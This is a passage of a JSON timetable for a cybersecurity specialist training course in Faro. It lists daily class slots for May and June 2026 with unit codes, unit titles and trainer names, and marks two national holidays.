"Interagir em Inglês nas Atividades do Setor da Informática", "formador": "Olinda Oliveira"}, {"hora": "12:00-13:00", "uc": "UC00599", "descricao": "Interagir em Inglês nas Atividades do Setor da Informática", "formador": "Olinda Oliveira"}, {"hora": "14:00-15:00", "uc": "UC01480", "descricao": "Analisar Evidências de Ataques Cibernéticos", "formador": "Paulo Ricardo Costa Ramalho"}, {"hora": "15:00-16:00", "uc": "UC01480", "descricao": "Analisar Evidências de Ataques Cibernéticos", "formador": "Paulo Ricardo Costa Ramalho"}, {"hora": "16:00-17:00", "uc": "UC01480", "descricao": "Analisar Evidências de Ataques Cibernéticos", "formador": "Paulo Ricardo Costa Ramalho"}]}, {"data": "2026-05-13", "dia_semana": "QUA", "aulas": [{"hora": "09:00-10:00", "uc": "UC00631", "descricao": "Planear e Instalar a Infraestrutura de Redes Locais", "formador": "Ivan Filipe Saloio Gonçalves"}, {"hora": "10:00-11:00", "uc": "UC00631", "descricao": "Planear e Instalar a Infraestrutura de Redes Locais", "formador": "Ivan Filipe Saloio Gonçalves"}, {"hora": "11:00-12:00", "uc": "UC00631", "descricao": "Planear e Instalar a Infraestrutura de Redes Locais", "formador": "Ivan Filipe Saloio Gonçalves"}, {"hora": "12:00-13:00", "uc": "UC00631", "descricao": "Planear e Instalar a Infraestrutura de Redes Locais", "formador": "Ivan Filipe Saloio Gonçalves"}, {"hora": "14:00-15:00", "uc": "UC00606", "descricao": "Desenvolver Programas em Linguagem Estruturada", "formador": "Iolanda Aquino Serro"}, {"hora": "15:00-16:00", "uc": "UC00606", "descricao": "Desenvolver Programas em Linguagem Estruturada", "formador": "Iolanda Aquino Serro"}, {"hora": "16:00-17:00", "uc": "UC00606", "descricao": "Desenvolver Programas em Linguagem Estruturada", "formador": "Iolanda Aquino Serro"}]}, {"data": "2026-05-14", "dia_semana": "QUI", "aulas": [{"hora": "09:00-10:00", "uc": "UC00034", "descricao": "Colaborar e Trabalhar em Equipa", "formador": "Lilian de Barros"}, {"hora": "10:00-11:00", "uc": "UC00034", "descricao": "Colaborar e Trabalhar em Equipa", "formador": "Lilian de Barros"}, {"hora": "11:00-12:00", "uc": "UC00034", "descricao": "Colaborar e Trabalhar em Equipa", "formador": "Lilian de Barros"}, {"hora": "12:00-13:00", "uc": "UC00034", "descricao": "Colaborar e Trabalhar em Equipa", "formador": "Lilian de Barros"}, {"hora": "14:00-15:00", "uc": "UC00631", "descricao": "Planear e Instalar a Infraestrutura de Redes Locais", "formador": "Ivan Filipe Saloio Gonçalves"}, {"hora": "15:00-16:00", "uc": "UC00631", "descricao": "Planear e Instalar a Infraestrutura de Redes Locais", "formador": "Ivan Filipe Saloio Gonçalves"}, {"hora": "16:00-17:00", "uc": "UC00631", "descricao": "Planear e Instalar a Infraestrutura de Redes Locais", "formador": "Ivan Filipe Saloio Gonçalves"}]}, {"data": "2026-05-15", "dia_semana": "SEX", "aulas": [{"hora": "09:00-10:00", "uc": "UC00631", "descricao": "Planear e Instalar a Infraestrutura de Redes Locais", "formador": "Ivan Filipe Saloio Gonçalves"}, {"hora": "10:00-11:00", "uc": "UC00631", "descricao": "Planear e Instalar a Infraestrutura de Redes Locais", "formador": "Ivan Filipe Saloio Gonçalves"}, {"hora": "11:00-12:00", "uc": "UC00631", "descricao": "Planear e Instalar a Infraestrutura de Redes Locais", "formador": "Ivan Filipe Saloio Gonçalves"}, {"hora": "12:00-13:00", "uc": "UC00631", "descricao": "Planear e Instalar a Infraestrutura de Redes Locais", "formador": "Ivan Filipe Saloio Gonçalves"}, {"hora": "14:00-15:00", "uc": "UC01480", "descricao": "Analisar Evidências de Ataques Cibernéticos", "formador": "Paulo Ricardo Costa Ramalho"}, {"hora": "15:00-16:00", "uc": "UC01480", "descricao": "Analisar Evidências de Ataques Cibernéticos", "formador": "Paulo Ricardo Costa Ramalho"}, {"hora": "16:00-17:00", "uc": "UC01480", "descricao": "Analisar Evidências de Ataques Cibernéticos", "formador": "Paulo Ricardo Costa Ramalho"}]}, {"data": "2026-05-18", "dia_semana": "SEG", "aulas": [{"hora": "09:00-10:00", "uc": "UC01477", "descricao": "Aplicar Métodos Estatísticos", "formador": "Jose Gabriel Fernandes Chaveca"}, {"hora": "10:00-11:00", "uc": "UC01477", "descricao": "Aplicar Métodos Estatísticos", "formador": "Jose Gabriel Fernandes Chaveca"}, {"hora": "11:00-12:00", "uc": "UC01477", "descricao": "Aplicar Métodos Estatísticos", "formador": "Jose Gabriel Fernandes Chaveca"}, {"hora": "12:00-13:00", "uc": "UC01477", "descricao": "Aplicar Métodos Estatísticos", "formador": "Jose Gabriel Fernandes Chaveca"}, {"hora": "14:00-15:00", "uc": "UC01476", "descricao": "Implementar a Legislação Relativa à Cibersegurança", "formador": "Luis Manuel Ferreira De Melo E Horta"}, {"hora": "15:00-16:00", "uc": "UC01476", "descricao": "Implementar a Legislação Relativa à Cibersegurança", "formador": "Luis Manuel Ferreira De Melo E Horta"}, {"hora": "16:00-17:00", "uc": "UC01476", "descricao": "Implementar a Legislação Relativa à Cibersegurança", "formador": "Luis Manuel Ferreira De Melo E Horta"}]}, {"data": "2026-05-19", "dia_semana": "TER", "aulas": [{"hora": "09:00-10:00", "uc": "UC00599", "descricao": "Interagir em Inglês nas Atividades do Setor da Informática", "formador": "Olinda Oliveira"}, {"hora": "10:00-11:00", "uc": "UC00599", "descricao": "Interagir em Inglês nas Atividades do Setor da Informática", "formador": "Olinda Oliveira"}, {"hora": "11:00-12:00", "uc": "UC00599", "descricao": "Interagir em Inglês nas Atividades do Setor da Informática", "formador": "Olinda Oliveira"}, {"hora": "12:00-13:00", "uc": "UC00599", "descricao": "Interagir em Inglês nas Atividades do Setor da Informática", "formador": "Olinda Oliveira"}, {"hora": "14:00-15:00", "uc": "UC00631", "descricao": "Planear e Instalar a Infraestrutura de Redes Locais", "formador": "Ivan Filipe Saloio Gonçalves"}, {"hora": "15:00-16:00", "uc": "UC00631", "descricao": "Planear e Instalar a Infraestrutura de Redes Locais", "formador": "Ivan Filipe Saloio Gonçalves"}, {"hora": "16:00-17:00", "uc": "UC00631", "descricao": "Planear e Instalar a Infraestrutura de Redes Locais", "formador": "Ivan Filipe Saloio Gonçalves"}]}, {"data": "2026-05-20", "dia_semana": "QUA", "aulas": [{"hora": "09:00-10:00", "uc": "UC00631", "descricao": "Planear e Instalar a Infraestrutura de Redes Locais", "formador": "Ivan Filipe Saloio Gonçalves"}, {"hora": "10:00-11:00", "uc": "UC00631", "descricao": "Planear e Instalar a Infraestrutura de Redes Locais", "formador": "Ivan Filipe Saloio Gonçalves"}, {"hora": "11:00-12:00", "uc": "UC00631", "descricao": "Planear e Instalar a Infraestrutura de Redes Locais", "formador": "Ivan Filipe Saloio Gonçalves"}, {"hora": "12:00-13:00", "uc": "UC00631", "descricao": "Planear e Instalar a Infraestrutura de Redes Locais", "formador": "Ivan Filipe Saloio Gonçalves"}, {"hora": "14:00-15:00", "uc": "UC00034", "descricao": "Colaborar e Trabalhar em Equipa", "formador": "Lilian de Barros"}, {"hora": "15:00-16:00", "uc": "UC00034", "descricao": "Colaborar e Trabalhar em Equipa", "formador": "Lilian de Barros"}, {"hora": "16:00-17:00", "uc": "UC00034", "descricao": "Colaborar e Trabalhar em Equipa", "formador": "Lilian de Barros"}]}, {"data": "2026-05-21", "dia_semana": "QUI", "aulas": [{"hora": "09:00-10:00", "uc": "UC00631", "descricao": "Planear e Instalar a Infraestrutura de Redes Locais", "formador": "Ivan Filipe Saloio Gonçalves"}, {"hora": "10:00-11:00", "uc": "UC00631", "descricao": "Planear e Instalar a Infraestrutura de Redes Locais", "formador": "Ivan Filipe Saloio Gonçalves"}, {"hora": "11:00-12:00", "uc": "UC00631", "descricao": "Planear e Instalar a Infraestrutura de Redes Locais", "formador": "Ivan Filipe Saloio Gonçalves"}, {"hora": "12:00-13:00", "uc": "UC00631", "descricao": "Planear e Instalar a Infraestrutura de Redes Locais", "formador": "Ivan Filipe Saloio Gonçalves"}, {"hora": "14:00-15:00", "uc": "UC01480", "descricao": "Analisar Evidências de Ataques Cibernéticos", "formador": "Paulo Ricardo Costa Ramalho"}, {"hora": "15:00-16:00", "uc": "UC01480", "descricao": "Analisar Evidências de Ataques Cibernéticos", "formador": "Paulo Ricardo Costa Ramalho"}, {"hora": "16:00-17:00", "uc": "UC01480", "descricao": "Analisar Evidências de Ataques Cibernéticos", "formador": "Paulo Ricardo Costa Ramalho"}]}, {"data": "2026-05-22", "dia_semana": "SEX", "aulas": [{"hora": "09:00-10:00", "uc": "UC00034", "descricao": "Colaborar e Trabalhar em Equipa", "formador": "Lilian de Barros"}, {"hora": "10:00-11:00", "uc": "UC00034", "descricao": "Colaborar e Trabalhar em Equipa", "formador": "Lilian de Barros"}, {"hora": "11:00-12:00", "uc": "UC00034", "descricao": "Colaborar e Trabalhar em Equipa", "formador": "Lilian de Barros"}, {"hora": "12:00-13:00", "uc": "UC00034", "descricao": "Colaborar e Trabalhar em Equipa", "formador": "Lilian de Barros"}, {"hora": "14:00-15:00", "uc": "UC01480", "descricao": "Analisar Evidências de Ataques Cibernéticos", "formador": "Paulo Ricardo Costa Ramalho"}, {"hora": "15:00-16:00", "uc": "UC01480", "descricao": "Analisar Evidências de Ataques Cibernéticos", "formador": "Paulo Ricardo Costa Ramalho"}, {"hora": "16:00-17:00", "uc": "UC01480", "descricao": "Analisar Evidências de Ataques Cibernéticos", "formador": "Paulo Ricardo Costa Ramalho"}]}, {"data": "2026-05-25", "dia_semana": "SEG", "aulas": [{"hora": "09:00-10:00", "uc": "UC01477", "descricao": "Aplicar Métodos Estatísticos", "formador": "Jose Gabriel Fernandes Chaveca"}, {"hora": "10:00-11:00", "uc": "UC01477", "descricao": "Aplicar Métodos Estatísticos", "formador": "Jose Gabriel Fernandes Chaveca"}, {"hora": "11:00-12:00", "uc": "UC01477", "descricao": "Aplicar Métodos Estatísticos", "formador": "Jose Gabriel Fernandes Chaveca"}, {"hora": "12:00-13:00", "uc": "UC01477", "descricao": "Aplicar Métodos Estatísticos", "formador": "Jose Gabriel Fernandes Chaveca"}, {"hora": "14:00-15:00", "uc": "UC01476", "descricao": "Implementar a Legislação Relativa à Cibersegurança", "formador": "Luis Manuel Ferreira De Melo E Horta"}, {"hora": "15:00-16:00", "uc": "UC01476", "descricao": "Implementar a Legislação Relativa à Cibersegurança", "formador": "Luis Manuel Ferreira De Melo E Horta"}, {"hora": "16:00-17:00", "uc": "UC01476", "descricao": "Implementar a Legislação Relativa à Cibersegurança", "formador": "Luis Manuel Ferreira De Melo E Horta"}]}, {"data": "2026-05-26", "dia_semana": "TER", "aulas": [{"hora": "09:00-10:00", "uc": "UC00599", "descricao": "Interagir em Inglês nas Atividades do Setor da Informática", "formador": "Olinda Oliveira"}, {"hora": "10:00-11:00", "uc": "UC00599", "descricao": "Interagir em Inglês nas Atividades do Setor da Informática", "formador": "Olinda Oliveira"}, {"hora": "11:00-12:00", "uc": "UC00599", "descricao": "Interagir em Inglês nas Atividades do Setor da Informática", "formador": "Olinda Oliveira"}, {"hora": "12:00-13:00", "uc": "UC00599", "descricao": "Interagir em Inglês nas Atividades do Setor da Informática", "formador": "Olinda Oliveira"}, {"hora": "14:00-15:00", "uc": "UC01480", "descricao": "Analisar Evidências de Ataques Cibernéticos", "formador": "Paulo Ricardo Costa Ramalho"}, {"hora": "15:00-16:00", "uc": "UC01480", "descricao": "Analisar Evidências de Ataques Cibernéticos", "formador": "Paulo Ricardo Costa Ramalho"}, {"hora": "16:00-17:00", "uc": "UC01480", "descricao": "Analisar Evidências de Ataques Cibernéticos", "formador": "Paulo Ricardo Costa Ramalho"}]}, {"data": "2026-05-27", "dia_semana": "QUA", "aulas": [{"hora": "09:00-10:00", "uc": "UC00631", "descricao": "Planear e Instalar a Infraestrutura de Redes Locais", "formador": "Ivan Filipe Saloio Gonçalves"}, {"hora": "10:00-11:00", "uc": "UC00631", "descricao": "Planear e Instalar a Infraestrutura de Redes Locais", "formador": "Ivan Filipe Saloio Gonçalves"}, {"hora": "11:00-12:00", "uc": "UC00631", "descricao": "Planear e Instalar a Infraestrutura de Redes Locais", "formador": "Ivan Filipe Saloio Gonçalves"}, {"hora": "12:00-13:00", "uc": "UC00631", "descricao": "Planear e Instalar a Infraestrutura de Redes Locais", "formador": "Ivan Filipe Saloio Gonçalves"}, {"hora": "14:00-15:00", "uc": "UC00034", "descricao": "Colaborar e Trabalhar em Equipa", "formador": "Lilian de Barros"}, {"hora": "15:00-16:00", "uc": "UC00034", "descricao": "Colaborar e Trabalhar em Equipa", "formador": "Lilian de Barros"}, {"hora": "16:00-17:00", "uc": "UC00034", "descricao": "Colaborar e Trabalhar em Equipa", "formador": "Lilian de Barros"}]}, {"data": "2026-05-28", "dia_semana": "QUI", "aulas": [{"hora": "09:00-10:00", "uc": "UC00631", "descricao": "Planear e Instalar a Infraestrutura de Redes Locais", "formador": "Ivan Filipe Saloio Gonçalves"}, {"hora": "10:00-11:00", "uc": "UC00634", "descricao": "Instalar, Configurar e Manter Sistema Operativo de Cliente", "formador": "Ivan Filipe Saloio Gonçalves"}, {"hora": "11:00-12:00", "uc": "UC00634", "descricao": "Instalar, Configurar e Manter Sistema Operativo de Cliente", "formador": "Ivan Filipe Saloio Gonçalves"}, {"hora": "12:00-13:00", "uc": "UC00634", "descricao": "Instalar, Configurar e Manter Sistema Operativo de Cliente", "formador": "Ivan Filipe Saloio Gonçalves"}, {"hora": "14:00-15:00", "uc": "UC01480", "descricao": "Analisar Evidências de Ataques Cibernéticos", "formador": "Paulo Ricardo Costa Ramalho"}, {"hora": "15:00-16:00", "uc": "UC01480", "descricao": "Analisar Evidências de Ataques Cibernéticos", "formador": "Paulo Ricardo Costa Ramalho"}, {"hora": "16:00-17:00", "uc": "UC01480", "descricao": "Analisar Evidências de Ataques Cibernéticos", "formador": "Paulo Ricardo Costa Ramalho"}]}, {"data": "2026-05-29", "dia_semana": "SEX", "aulas": [{"hora": "09:00-10:00", "uc": "UC00034", "descricao": "Colaborar e Trabalhar em Equipa", "formador": "Lilian de Barros"}, {"hora": "10:00-11:00", "uc": "UC00034", "descricao": "Colaborar e Trabalhar em Equipa", "formador": "Lilian de Barros"}, {"hora": "11:00-12:00", "uc": "UC00034", "descricao": "Colaborar e Trabalhar em Equipa", "formador": "Lilian de Barros"}, {"hora": "12:00-13:00", "uc": "UC00034", "descricao": "Colaborar e Trabalhar em Equipa", "formador": "Lilian de Barros"}, {"hora": "14:00-15:00", "uc": "UC01480", "descricao": "Analisar Evidências de Ataques Cibernéticos", "formador": "Paulo Ricardo Costa Ramalho"}, {"hora": "15:00-16:00", "uc": "UC01480", "descricao": "Analisar Evidências de Ataques Cibernéticos", "formador": "Paulo Ricardo Costa Ramalho"}, {"hora": "16:00-17:00", "uc": "UC01480", "descricao": "Analisar Evidências de Ataques Cibernéticos", "formador": "Paulo Ricardo Costa Ramalho"}]}]}, {"instituicao": "Centro de Emprego e Formação Profissional de Faro", "modalidade": "Cursos de Especialização Tecnológica - CET", "designacao": "Técnico/a Especialista em Cibersegurança", "codigo_financeiro": "481110E0007", "codigo_administrativo": "11650885", "nivel": 5, "mes_ano": "junho 2026", "horario_diario": "09:00-17:00", "dias": [{"data": "2026-06-01", "dia_semana": "SEG", "aulas": [{"hora": "09:00-10:00", "uc": "UC01477", "descricao": "Aplicar Métodos Estatísticos", "formador": "Jose Gabriel Fernandes Chaveca"}, {"hora": "10:00-11:00", "uc": "UC01477", "descricao": "Aplicar Métodos Estatísticos", "formador": "Jose Gabriel Fernandes Chaveca"}, {"hora": "11:00-12:00", "uc": "UC01477", "descricao": "Aplicar Métodos Estatísticos", "formador": "Jose Gabriel Fernandes Chaveca"}, {"hora": "12:00-13:00", "uc": "UC01477", "descricao": "Aplicar Métodos Estatísticos", "formador": "Jose Gabriel Fernandes Chaveca"}, {"hora": "14:00-15:00", "uc": "UC01476", "descricao": "Implementar a Legislação Relativa à Cibersegurança", "formador": "Luis Manuel Ferreira De Melo E Horta"}, {"hora": "15:00-16:00", "uc": "UC01476", "descricao": "Implementar a Legislação Relativa à Cibersegurança", "formador": "Luis Manuel Ferreira De Melo E Horta"}]}, {"data": "2026-06-02", "dia_semana": "TER", "aulas": [{"hora": "09:00-10:00", "uc": "UC00599", "descricao": "Interagir em Inglês nas Atividades do Setor da Informática", "formador": "Olinda Oliveira"}, {"hora": "10:00-11:00", "uc": "UC00599", "descricao": "Interagir em Inglês nas Atividades do Setor da Informática", "formador": "Olinda Oliveira"}, {"hora": "11:00-12:00", "uc": "UC00599", "descricao": "Interagir em Inglês nas Atividades do Setor da Informática", "formador": "Olinda Oliveira"}, {"hora": "12:00-13:00", "uc": "UC00599", "descricao": "Interagir em Inglês nas Atividades do Setor da Informática", "formador": "Olinda Oliveira"}, {"hora": "14:00-15:00", "uc": "UC01480", "descricao": "Analisar Evidências de Ataques Cibernéticos", "formador": "Paulo Ricardo Costa Ramalho"}, {"hora": "15:00-16:00", "uc": "UC01480", "descricao": "Analisar Evidências de Ataques Cibernéticos", "formador": "Paulo Ricardo Costa Ramalho"}, {"hora": "16:00-17:00", "uc": "UC01480", "descricao": "Analisar Evidências de Ataques Cibernéticos", "formador": "Paulo Ricardo Costa Ramalho"}]}, {"data": "2026-06-03", "dia_semana": "QUA", "aulas": [{"hora": "09:00-10:00", "uc": "UC00034", "descricao": "Colaborar e Trabalhar em Equipa", "formador": "Lilian de Barros"}, {"hora": "10:00-11:00", "uc": "UC00034", "descricao": "Colaborar e Trabalhar em Equipa", "formador": "Lilian de Barros"}, {"hora": "11:00-12:00", "uc": "UC00034", "descricao": "Colaborar e Trabalhar em Equipa", "formador": "Lilian de Barros"}, {"hora": "12:00-13:00", "uc": "UC00034", "descricao": "Colaborar e Trabalhar em Equipa", "formador": "Lilian de Barros"}, {"hora": "14:00-15:00", "uc": "UC00606", "descricao": "Desenvolver Programas em Linguagem Estruturada", "formador": "Iolanda Aquino Serro"}, {"hora": "15:00-16:00", "uc": "UC00606", "descricao": "Desenvolver Programas em Linguagem Estruturada", "formador": "Iolanda Aquino Serro"}, {"hora": "16:00-17:00", "uc": "UC00606", "descricao": "Desenvolver Programas em Linguagem Estruturada", "formador": "Iolanda Aquino Serro"}]}, {"data": "2026-06-04", "dia_semana": "QUI", "aulas": [], "nota": "Feriado Nacional �\u001d Corpus Christi"}, {"data": "2026-06-05", "dia_semana": "SEX", "aulas": [{"hora": "09:00-10:00", "uc": "UC00635", "descricao": "Configurar Serviços de Rede", "formador": "Ivan Filipe Saloio Gonçalves"}, {"hora": "10:00-11:00", "uc": "UC00635", "descricao": "Configurar Serviços de Rede", "formador": "Ivan Filipe Saloio Gonçalves"}, {"hora": "11:00-12:00", "uc": "UC00635", "descricao": "Configurar Serviços de Rede", "formador": "Ivan Filipe Saloio Gonçalves"}, {"hora": "12:00-13:00", "uc": "UC00635", "descricao": "Configurar Serviços de Rede", "formador": "Ivan Filipe Saloio Gonçalves"}, {"hora": "14:00-15:00", "uc": "UC00606", "descricao": "Desenvolver Programas em Linguagem Estruturada", "formador": "Iolanda Aquino Serro"}, {"hora": "15:00-16:00", "uc": "UC00606", "descricao": "Desenvolver Programas em Linguagem Estruturada", "formador": "Iolanda Aquino Serro"}, {"hora": "16:00-17:00", "uc": "UC00606", "descricao": "Desenvolver Programas em Linguagem Estruturada", "formador": "Iolanda Aquino Serro"}]}, {"data": "2026-06-08", "dia_semana": "SEG", "aulas": [{"hora": "09:00-10:00", "uc": "UC01477", "descricao": "Aplicar Métodos Estatísticos", "formador": "Jose Gabriel Fernandes Chaveca"}, {"hora": "10:00-11:00", "uc": "UC01477", "descricao": "Aplicar Métodos Estatísticos", "formador": "Jose Gabriel Fernandes Chaveca"}, {"hora": "11:00-12:00", "uc": "UC01477", "descricao": "Aplicar Métodos Estatísticos", "formador": "Jose Gabriel Fernandes Chaveca"}, {"hora": "12:00-13:00", "uc": "UC01477", "descricao": "Aplicar Métodos Estatísticos", "formador": "Jose Gabriel Fernandes Chaveca"}, {"hora": "14:00-15:00", "uc": "UC00606", "descricao": "Desenvolver Programas em Linguagem Estruturada", "formador": "Iolanda Aquino Serro"}, {"hora": "15:00-16:00", "uc": "UC00606", "descricao": "Desenvolver Programas em Linguagem Estruturada", "formador": "Iolanda Aquino Serro"}, {"hora": "16:00-17:00", "uc": "UC00606", "descricao": "Desenvolver Programas em Linguagem Estruturada", "formador": "Iolanda Aquino Serro"}]}, {"data": "2026-06-09", "dia_semana": "TER", "aulas": [{"hora": "09:00-10:00", "uc": "UC00599", "descricao": "Interagir em Inglês nas Atividades do Setor da Informática", "formador": "Olinda Oliveira"}, {"hora": "10:00-11:00", "uc": "UC00599", "descricao": "Interagir em Inglês nas Atividades do Setor da Informática", "formador": "Olinda Oliveira"}, {"hora": "11:00-12:00", "uc": "UC00599", "descricao": "Interagir em Inglês nas Atividades do Setor da Informática", "formador": "Olinda Oliveira"}, {"hora": "12:00-13:00", "uc": "UC00599", "descricao": "Interagir em Inglês nas Atividades do Setor da Informática", "formador": "Olinda Oliveira"}, {"hora": "14:00-15:00", "uc": "UC01480", "descricao": "Analisar Evidências de Ataques Cibernéticos", "formador": "Paulo Ricardo Costa Ramalho"}, {"hora": "15:00-16:00", "uc": "UC01480", "descricao": "Analisar Evidências de Ataques Cibernéticos", "formador": "Paulo Ricardo Costa Ramalho"}, {"hora": "16:00-17:00", "uc": "UC01480", "descricao": "Analisar Evidências de Ataques Cibernéticos", "formador": "Paulo Ricardo Costa Ramalho"}]}, {"data": "2026-06-10", "dia_semana": "QUA", "aulas": [], "nota": "Feriado Nacional �\u001d Dia de Portugal, de Camões e das Comunidades Portuguesas"}, {"data": "2026-06-11", "dia_semana": "QUI", "aulas": [{"hora": "09:00-10:00", "uc": "UC00034", "descricao": "Colaborar e Trabalhar em Equipa", "formador": "Lilian de Barros"}, {"hora": "10:00-11:00", "uc": "UC00034", "descricao": "Colaborar e Trabalhar em Equipa", "formador": "Lilian de Barros"}, {"hora": "11:00-12:00", "uc": "UC00034", "descricao": "Colaborar e Trabalhar em Equipa", "formador": "Lilian de Barros"}, {"hora": "12:00-13:00", "uc": "UC00034", "descricao": "Colaborar e Trabalhar em Equipa", "formador": "Lilian de Barros"}, {"hora": "14:00-15:00", "uc": "UC00606", "descricao": "Desenvolver Programas em Linguagem Estruturada", "formador": "Iolanda Aquino Serro"}, {"hora": "15:00-16:00", "uc": "UC00606", "descricao": "Desenvolver Programas em Linguagem Estruturada", "formador": "Iolanda Aquino Serro"}, {"hora": "16:00-17:00", "uc": "UC00606", "descricao": "Desenvolver Programas em Linguagem Estruturada", "formador": "Iolanda Aquino Serro"}]}, {"data": "2026-06-12", "dia_semana": "SEX", "aulas": [{"hora": "09:00-10:00", "uc": "UC00635", "descricao": "Configurar Serviços de Rede", "formador": "Ivan Filipe Saloio Gonçalves"}, {"hora": "10:00-11:00", "uc": "UC00635", "descricao": "Configurar Serviços de Rede", "formador": "Ivan Filipe Saloio Gonçalves"}, {"hora": "11:00-12:00", "uc": "UC00635", "descricao": "Configurar Serviços de Rede", "formador": "Ivan Filipe Saloio Gonçalves"}, {"hora": "12:00-13:00", "uc": "UC00635", "descricao": "Configurar Serviços de Rede", "formador": "Ivan Filipe Saloio Gonçalves"}, {"hora": "14:00-15:00", "uc": "UC00606", "descricao": "Desenvolver Programas em Linguagem Estruturada", "formador": "Iolanda Aquino Serro"}, {"hora": "15:00-16:00", "uc": "UC00606", "descricao": "Desenvolver Programas em Linguagem Estruturada", "formador": "Iolanda Aquino Serro"}, {"hora": "16:00-17:00", "uc": "UC00606", "descricao": "Desenvolver Programas em Linguagem Estruturada", "formador": "Iolanda Aquino Serro"}]}, {"data": "2026-06-15", "dia_semana": "SEG", "aulas": [{"hora": "09:00-10:00", "uc": "UC01477", "descricao": "Aplicar Métodos Estatísticos", "formador": "Jose Gabriel Fernandes Chaveca"}, {"hora": "10:00-11:00", "uc": "UC01477", "descricao": "Aplicar Métodos Estatísticos", "formador": "Jose Gabriel Fernandes Chaveca"}, {"hora": "11:00-12:00", "uc": "UC01477", "descricao": "Aplicar Métodos Estatísticos", "formador": "Jose Gabriel Fernandes Chaveca"}, {"hora": "12:00-13:00", "uc": "UC01477", "descricao": "Aplicar Métodos Estatísticos", "formador": "Jose Gabriel Fernandes Chaveca"}, {"hora": "14:00-15:00", "uc": "UC01480", "descricao": "Analisar Evidências de Ataques Cibernéticos", "formador": "Paulo Ricardo Costa Ramalho"}, {"hora": "15:00-16:00", "uc": "UC01480", "descricao": "Analisar Evidências de Ataques Cibernéticos", "formador": "Paulo Ricardo Costa Ramalho"}, {"hora": "16:00-17:00", "uc": "UC01480", "descricao": "Analisar Evidências de Ataques Cibernéticos", "formador": "Paulo Ricardo Costa Ramalho"}]}, {"data": "2026-06-16", "dia_semana": "TER", "aulas": [{"hora": "09:00-10:00", "uc": "UC00599", "descricao": "Interagir em Inglês nas Atividades do Setor da Informática", "formador": "Olinda Oliveira"}, {"hora": "10:00-11:00", "uc": "UC00599", "descricao": "Interagir em Inglês nas Atividades do Setor da Informática", "formador": "Olinda Oliveira"}, {"hora": "11:00-12:00", "uc": "UC00599", "descricao": "Interagir em Inglês nas Atividades do Setor da Informática", "formador": "Olinda Oliveira"}, {"hora": "12:00-13:00", "uc": "UC00599", "descricao": "Interagir em Inglês nas Atividades do Setor da Informática", "formador": "Olinda Oliveira"}, {"hora": "14:00-15:00", "uc": "UC00034", "descricao": "Colaborar e Trabalhar em Equipa", "formador": "Lilian de Barros"}, {"hora": "15:00-16:00", "uc": "UC00034", "descricao": "Colaborar e Trabalhar em Equipa", "formador": "Lilian de Barros"}, {"hora": "16:00-17:00", "uc": "UC00034", "descricao": "Colaborar e Trabalhar em Equipa", "formador": "Lilian de Barros"}]}, {"data": "2026-06-17", "dia_semana": "QUA", "aulas": [{"hora": "09:00-10:00", "uc": "UC00635", "descricao": "Configurar Serviços de Rede", "formador": "Ivan Filipe Saloio Gonçalves"}, {"hora": "10:00-11:00", "uc": "UC00635", "descricao": "Configurar Serviços de Rede", "formador": "Ivan Filipe Saloio Gonçalves"}, {"hora": "11:00-12:00", "uc": "UC00634", "descricao": "Instalar, Configurar e Manter Sistema Operativo de Cliente", "formador": "Ivan Filipe Saloio Gonçalves"}, {"hora": "12:00-13:00", "uc": "UC00634", "descricao": "Instalar, Configurar e Manter Sistema Operativo de Cliente", "formador": "Ivan Filipe Saloio Gonçalves"}, {"hora": "14:00-15:00", "uc": "UC01480", "descricao": "Analisar Evidências de Ataques Cibernéticos", "formador": "Paulo Ricardo Costa Ramalho"}, {"hora": "15:00-16:00", "uc": "UC01480", "descricao": "Analisar Evidências de Ataques Cibernéticos", "formador": "Paulo Ricardo Costa Ramalho"}, {"hora": "16:00-17:00", "uc": "UC01480", "descricao": "Analisar Evidências de Ataques Cibernéticos", "formador": "Paulo Ricardo Costa Ramalho"}]}, {"data": "2026-06-18", "dia_semana": "QUI", "aulas": [{"hora": "09:00-10:00", "uc": "UC00034", "descricao": "Colaborar e Trabalhar em Equipa", "formador": "Lilian de Barros"}, {"hora": "10:00-11:00", "uc": "UC00034", "descricao": "Colaborar e Trabalhar em Equipa", "formador": "Lilian de Barros"}, {"hora": "11:00-12:00", "uc": "UC00034", "descricao": "Colaborar e Trabalhar em Equipa", "formador": "Lilian de Barros"}, {"hora": "12:00-13:00", "uc": "UC00034", "descricao": "Colaborar e Trabalhar em Equipa", "formador": "Lilian de Barros"}, {"hora": "14:00-15:00", "uc": "UC00034", "descricao": "Colaborar e Trabalhar em Equipa", "formador": "Lilian de Barros"}, {"hora": "15:00-16:00", "uc": "UC00034", "descricao": "Colaborar e Trabalhar em Equipa", "formador": "Lilian de Barros"}, {"hora": "16:00-17:00", "uc": "UC00034", "descricao": "Colaborar e Trabalhar em Equipa", "formador": "Lilian de Barros"}]}, {"data": "2026-06-19", "dia_semana": "SEX", "aulas": [{"hora": "09:00-10:00", "uc": "UC00034", "descricao": "Colaborar e Trabalhar em Equipa", "formador": "Lilian de Barros"}, {"hora": "10:00-11:00", "uc": "UC00034", "descricao": "Colaborar e Trabalhar em Equipa", "formador": "Lilian de Barros"}, {"hora": "11:00-12:00", "uc": "UC00034", "descricao": "Colaborar e Trabalhar em Equipa", "formador": "Lilian de Barros"}, {"hora": "12:00-13:00", "uc": "UC00034", "descricao": "Colaborar e Trabalhar em Equipa", "formador": "Lilian de Barros"}, {"hora": "14:00-15:00", "uc": "UC00634", "descricao": "Instalar, Configurar e Manter Sistema Operativo de Cliente", "formador": "Ivan Filipe Saloio Gonçalves"}, {"hora": "15:00-16:00", "uc": "UC00634", "descricao": "Instalar, Configurar e Manter Sistema Operativo de Cliente", "formador": "Ivan Filipe Saloio Gonçalves"}, {"hora": "16:00-17:00", "uc": "UC00634", "descricao": "Instalar, Configurar e Manter Sistema Operativo de Cliente", "formador": "Ivan Filipe Saloio Gonçalves"}]}, {"data": "2026-06-22", "dia_semana": "SEG", "aulas": [{"hora": "09:00-10:00", "uc": "UC01477", "descricao": "Aplicar Métodos Estatísticos", "formador": "Jose Gabriel Fernandes Chaveca"}, {"hora": "10:00-11:00", "uc": "UC01477", "descricao": "Aplicar Métodos Estatísticos", "formador": "Jose Gabriel Fernandes Chaveca"}, {"hora": "11:00-12:00", "uc": "UC01477", "descricao": "Aplicar Métodos Estatísticos", "formador": "Jose Gabriel Fernandes Chaveca"}, {"hora": "12:00-13:00", "uc": "UC01477", "descricao": "Aplicar Métodos Estatísticos", "formador": "Jose Gabriel Fernandes Chaveca"}, {"hora": "14:00-15:00", "uc": "UC00606", "descricao": "Desenvolver Programas em Linguagem Estruturada", "formador": "Iolanda Aquino Serro"}, {"hora": "15:00-16:00", 